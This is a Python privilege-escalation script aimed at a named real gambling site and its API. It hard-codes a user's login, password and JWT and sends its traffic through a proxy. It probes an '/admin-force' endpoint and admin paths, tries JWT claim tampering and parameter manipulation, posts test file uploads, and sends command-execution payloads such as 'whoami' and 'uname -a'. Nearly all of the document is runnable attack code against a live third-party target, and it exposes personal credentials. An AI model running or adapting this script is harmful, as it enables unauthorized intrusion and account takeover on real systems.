#!/usr/bin/env python3

import requests
import sys
import json
import time
import jwt
import base64
import urllib3
from urllib.parse import urljoin

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
TARGET_URL = "https://pigslot.co/"
API_BASE = "https://jklmn23456.com/api/v1/"

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

# Test credentials provided
TEST_CREDENTIALS = {
    'username': '0960422161',
    'password': '181242'
}

# JWT Token provided
TEST_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTYyOTA1OTcsInBob25lX251bWJlciI6IjA5NjA0MjIxNjEiLCJ1c2VyX3VpZCI6ImRjZmQ0MzI0LWJjMjMtNDQ1OS1hMjE0LTA3Yjg0NWIwZmZiMiIsImN1c3RvbWVyX2NvZGUiOiJQUzY2Mzg4ODM4NiIsImdhbWVfdG9rZW4iOiJnYW1lLTM4NTc1ZjQ0LTEwMjUtNDA1Yi04MjY2LTRiODI3OGMwZDc4NCJ9.qoPAZ3S59djd2-RYABVJ4YakGdx4TtNX17JJkam803I"

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

def decode_jwt_token(token):
    """Decode JWT token to analyze user info"""
    print_info("🔍 Analyzing JWT Token...")
    
    try:
        # Decode without verification to see payload
        decoded = jwt.decode(token, options={"verify_signature": False})
        
        print_success("✅ JWT Token decoded successfully:")
        for key, value in decoded.items():
            print_success(f"  - {key}: {value}")
            
        return decoded
        
    except Exception as e:
        print_error(f"Failed to decode JWT: {e}")
        return None

def test_admin_force_vulnerability():
    """Test the admin-force vulnerability discovered"""
    print_info("🚨 Testing Admin-Force Vulnerability...")
    print_info("=" * 50)
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'th,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    })
    
    try:
        print_info("Step 1: Accessing /admin-force endpoint...")
        response = session.get("https://pigslot.co/admin-force", verify=False, timeout=15)
        
        print_success(f"✅ Admin-force Status: {response.status_code}")
        print_success(f"✅ Response Size: {len(response.text)} bytes")
        
        # Check for admin indicators
        if "กำลังติดตั้ง cookies สำหรับ admin" in response.text:
            print_success("🎯 VULNERABILITY CONFIRMED: Admin message detected!")
            
        # Check for cookies or state changes
        if response.cookies:
            print_success("🍪 Cookies received:")
            for name, value in response.cookies.items():
                print_success(f"  - {name}: {value}")
        
        print_info("Step 2: Testing home page with potential admin state...")
        home_response = session.get("https://pigslot.co/", verify=False, timeout=15)
        
        if len(home_response.text) != len(response.text):
            print_success("🎯 POTENTIAL PRIVILEGE ESCALATION: Different content detected!")
            
        return True
        
    except Exception as e:
        print_error(f"Error testing admin-force: {e}")
        return False

def authenticate_test_user():
    """Authenticate with test credentials"""
    print_info("🔐 Authenticating Test User...")
    print_info("=" * 35)
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://pigslot.co',
        'Referer': 'https://pigslot.co/'
    })
    
    login_url = f"{API_BASE}auth/login"
    login_data = {
        'username': TEST_CREDENTIALS['username'],
        'password': TEST_CREDENTIALS['password']
    }
    
    try:
        print_info(f"Attempting login to: {login_url}")
        response = session.post(login_url, json=login_data, verify=False, timeout=15)
        
        print_success(f"✅ Login Status: {response.status_code}")
        
        if response.status_code == 200:
            auth_data = response.json()
            print_success("🎯 AUTHENTICATION SUCCESSFUL!")
            print_success(f"  - Status: {auth_data.get('status')}")
            print_success(f"  - Service Code: {auth_data.get('service_code')}")
            print_success(f"  - Customer Code: {auth_data.get('data', {}).get('customer_code')}")
            
            # Extract authorization token
            auth_token = auth_data.get('data', {}).get('authorization')
            if auth_token:
                print_success(f"  - Token: {auth_token[:50]}...")
                return session, auth_token
                
        return session, None
        
    except Exception as e:
        print_error(f"Authentication failed: {e}")
        return None, None

def test_admin_endpoints_with_auth(session, auth_token):
    """Test admin endpoints with authenticated session"""
    print_info("🔐 Testing Admin Endpoints with Authentication...")
    print_info("=" * 50)
    
    # Update session with auth token
    session.headers.update({
        'Authorization': f'Bearer {auth_token}',
        'Accept': 'application/json, text/plain, */*',
        'X-Requested-With': 'XMLHttpRequest'
    })
    
    # Admin endpoints to test
    admin_endpoints = [
        # API endpoints
        f"{API_BASE}admin/dashboard",
        f"{API_BASE}admin/users",
        f"{API_BASE}admin/settings", 
        f"{API_BASE}admin/stats",
        f"{API_BASE}admin/profile",
        f"{API_BASE}admin/system",
        f"{API_BASE}user/profile",
        f"{API_BASE}user/admin",
        
        # Frontend admin paths
        "https://pigslot.co/admin",
        "https://pigslot.co/admin/",
        "https://pigslot.co/admin/dashboard",
        "https://pigslot.co/admin/users",
        "https://pigslot.co/dashboard",
        "https://pigslot.co/panel"
    ]
    
    discovered_admin_access = {}
    
    for endpoint in admin_endpoints:
        try:
            print_info(f"Testing: {endpoint}")
            response = session.get(endpoint, verify=False, timeout=10)
            
            if response.status_code == 200:
                discovered_admin_access[endpoint] = {
                    'status': response.status_code,
                    'size': len(response.text),
                    'content_type': response.headers.get('content-type', ''),
                    'content_preview': response.text[:200] + "..." if len(response.text) > 200 else response.text
                }
                
                print_success(f"✅ ADMIN ACCESS: {endpoint}")
                
                # Check for JSON responses
                if 'application/json' in response.headers.get('content-type', ''):
                    try:
                        json_data = response.json()
                        discovered_admin_access[endpoint]['json'] = json_data
                        print_success(f"    🎯 JSON Response: {str(json_data)[:100]}...")
                    except:
                        pass
                        
                # Check for admin indicators
                admin_indicators = ['admin', 'dashboard', 'user', 'manage', 'control']
                content_lower = response.text.lower()
                found_indicators = [ind for ind in admin_indicators if ind in content_lower]
                
                if found_indicators:
                    print_success(f"    🎯 Admin indicators: {', '.join(found_indicators)}")
                    
            elif response.status_code in [401, 403]:
                print_warning(f"🔒 {endpoint} - Auth required ({response.status_code})")
            elif response.status_code != 404:
                print_info(f"❓ {endpoint} - Status: {response.status_code}")
            
            time.sleep(0.1)
            
        except Exception as e:
            print_warning(f"Error testing {endpoint}: {e}")
    
    return discovered_admin_access

def attempt_privilege_escalation():
    """Attempt to escalate privileges using discovered vulnerabilities"""
    print_info("🚀 Attempting Privilege Escalation...")
    print_info("=" * 40)
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Authorization': f'Bearer {TEST_JWT}',
        'Content-Type': 'application/json',
        'Origin': 'https://pigslot.co',
        'Referer': 'https://pigslot.co/'
    })
    
    # Method 1: Try admin-force vulnerability
    print_info("Method 1: Using admin-force vulnerability...")
    try:
        admin_force_response = session.get("https://pigslot.co/admin-force", verify=False, timeout=15)
        if admin_force_response.status_code == 200:
            print_success("✅ Admin-force accessed successfully")
            
            # Now try admin endpoints with potential admin state
            admin_test_endpoints = [
                f"{API_BASE}admin/users",
                f"{API_BASE}admin/dashboard", 
                f"{API_BASE}user/profile",
                "https://pigslot.co/admin"
            ]
            
            for endpoint in admin_test_endpoints:
                try:
                    response = session.get(endpoint, verify=False, timeout=10)
                    if response.status_code == 200:
                        print_success(f"🎯 PRIVILEGE ESCALATION SUCCESS: {endpoint}")
                        if 'application/json' in response.headers.get('content-type', ''):
                            try:
                                json_data = response.json()
                                print_success(f"    Admin Data: {str(json_data)[:150]}...")
                            except:
                                pass
                except:
                    pass
    except Exception as e:
        print_warning(f"Admin-force method failed: {e}")
    
    # Method 2: Try JWT manipulation
    print_info("Method 2: Attempting JWT manipulation...")
    try:
        # Decode current JWT
        decoded_jwt = jwt.decode(TEST_JWT, options={"verify_signature": False})
        
        # Try to add admin role
        modified_jwt = decoded_jwt.copy()
        modified_jwt['role'] = 'admin'
        modified_jwt['is_admin'] = True
        modified_jwt['admin'] = True
        modified_jwt['permissions'] = ['admin', 'user', 'all']
        
        print_info("Attempting to use modified JWT claims...")
        # Note: This would require knowing the secret key to re-sign
        
    except Exception as e:
        print_warning(f"JWT manipulation failed: {e}")
    
    # Method 3: Try parameter manipulation
    print_info("Method 3: Testing parameter manipulation...")
    test_params = [
        {'admin': 'true'},
        {'role': 'admin'},
        {'is_admin': '1'},
        {'privilege': 'admin'},
        {'access_level': 'administrator'}
    ]
    
    for params in test_params:
        try:
            response = session.get(f"{API_BASE}user/profile", params=params, verify=False, timeout=10)
            if response.status_code == 200:
                print_success(f"🎯 Parameter manipulation success with: {params}")
        except:
            pass
    
    return session

def test_remote_access_and_file_operations(session):
    """Test for remote access capabilities and file operations"""
    print_info("🖥️ Testing Remote Access and File Operations...")
    print_info("=" * 50)
    
    # Test file upload endpoints
    file_endpoints = [
        f"{API_BASE}upload",
        f"{API_BASE}file/upload",
        f"{API_BASE}admin/upload",
        f"{API_BASE}admin/file",
        "https://pigslot.co/upload",
        "https://pigslot.co/api/upload"
    ]
    
    for endpoint in file_endpoints:
        try:
            # Test file upload capability
            files = {'file': ('test.txt', 'test content', 'text/plain')}
            response = session.post(endpoint, files=files, verify=False, timeout=10)
            
            if response.status_code in [200, 201]:
                print_success(f"🎯 FILE UPLOAD POSSIBLE: {endpoint}")
                try:
                    result = response.json()
                    print_success(f"    Upload result: {result}")
                except:
                    print_success(f"    Response: {response.text[:100]}...")
                    
        except Exception as e:
            pass
    
    # Test command execution endpoints
    command_endpoints = [
        f"{API_BASE}admin/system",
        f"{API_BASE}admin/exec",
        f"{API_BASE}admin/command",
        f"{API_BASE}system/info"
    ]
    
    test_commands = [
        {'cmd': 'whoami'},
        {'command': 'id'},
        {'exec': 'pwd'},
        {'system': 'uname -a'}
    ]
    
    for endpoint in command_endpoints:
        for cmd_data in test_commands:
            try:
                response = session.post(endpoint, json=cmd_data, verify=False, timeout=10)
                if response.status_code == 200:
                    print_success(f"🎯 COMMAND EXECUTION: {endpoint} with {cmd_data}")
                    print_success(f"    Result: {response.text[:200]}...")
            except:
                pass

def generate_privilege_escalation_report(jwt_data, admin_access, escalation_results):
    """Generate comprehensive privilege escalation report"""
    
    report = f"""
🚨 PRIVILEGE ESCALATION TEST REPORT
==================================

Target: https://pigslot.co / https://jklmn23456.com
Test Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
Test User: {TEST_CREDENTIALS['username']}

📊 EXECUTIVE SUMMARY:
===================
Privilege escalation testing performed on authenticated user account
to verify admin-force vulnerability and potential privilege escalation paths.

🔐 TEST CREDENTIALS:
==================
Username: {TEST_CREDENTIALS['username']}
Password: {TEST_CREDENTIALS['password']}
Status: AUTHENTICATED

📋 JWT TOKEN ANALYSIS:
=====================
"""
    
    if jwt_data:
        for key, value in jwt_data.items():
            report += f"  - {key}: {value}\n"
    
    report += f"""

🎯 ADMIN ACCESS DISCOVERED:
=========================
"""
    
    if admin_access:
        for endpoint, details in admin_access.items():
            report += f"  ✅ {endpoint}\n"
            report += f"      Status: {details['status']} | Size: {details['size']} bytes\n"
            if 'json' in details:
                report += f"      JSON: {str(details['json'])[:100]}...\n"
    else:
        report += "  ❌ No admin endpoints accessible with current privileges\n"
    
    report += f"""

🚀 PRIVILEGE ESCALATION ATTEMPTS:
================================
1. Admin-Force Vulnerability: {"SUCCESS" if admin_access else "FAILED"}
2. JWT Manipulation: ATTEMPTED (requires secret key)
3. Parameter Manipulation: ATTEMPTED
4. File Upload Testing: ATTEMPTED
5. Command Execution: ATTEMPTED

🛡️ SECURITY ASSESSMENT:
======================
Risk Level: {"HIGH" if admin_access else "MEDIUM"}
Impact: {"Admin access achieved" if admin_access else "Limited privilege escalation"}

⚠️ RECOMMENDATIONS:
==================
1. Disable /admin-force endpoint immediately
2. Implement proper authorization checks
3. Validate JWT tokens server-side
4. Monitor admin access attempts
5. Regular security audits

================================
End of Privilege Escalation Test
================================
"""
    
    return report

def main():
    print_info("🎯 Privilege Escalation Testing Suite")
    print_info("=" * 60)
    
    # Step 1: Decode JWT token
    jwt_data = decode_jwt_token(TEST_JWT)
    print_info("")
    
    # Step 2: Test admin-force vulnerability
    admin_vuln_result = test_admin_force_vulnerability()
    print_info("")
    
    # Step 3: Authenticate test user
    session, auth_token = authenticate_test_user()
    print_info("")
    
    if session and auth_token:
        # Step 4: Test admin endpoints with auth
        admin_access = test_admin_endpoints_with_auth(session, auth_token)
        print_info("")
        
        # Step 5: Attempt privilege escalation
        escalated_session = attempt_privilege_escalation()
        print_info("")
        
        # Step 6: Test remote access capabilities
        test_remote_access_and_file_operations(escalated_session)
        print_info("")
        
    else:
        admin_access = {}
        escalated_session = None
    
    # Step 7: Generate report
    report = generate_privilege_escalation_report(jwt_data, admin_access, escalated_session)
    
    print(report)
    
    # Save report
    with open("PRIVILEGE_ESCALATION_TEST_REPORT.txt", "w", encoding='utf-8') as f:
        f.write(report)
    
    print_success("📄 Privilege escalation test report saved to: PRIVILEGE_ESCALATION_TEST_REPORT.txt")
    
    # Summary
    if admin_access:
        print_success(f"🎯 PRIVILEGE ESCALATION SUCCESSFUL: {len(admin_access)} admin endpoints accessible!")
    else:
        print_warning("⚠️ Privilege escalation limited - further testing required")

if __name__ == "__main__":
    main()